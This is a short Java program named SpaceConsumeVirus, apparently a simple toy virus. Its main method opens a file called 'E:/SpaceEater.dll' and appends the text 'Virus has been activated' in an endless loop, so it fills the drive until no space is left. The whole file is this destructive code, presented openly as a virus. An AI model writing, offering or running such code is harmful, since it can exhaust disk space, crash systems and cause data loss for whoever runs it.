import java.io.*;

public class SpaceConsumeVirus{
    public static void main(String[] args) {
        try{
            FileWriter fw = new FileWriter("E:/SpaceEater.dll",true);
            while(true){
                fw.write("Virus has been activated");
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}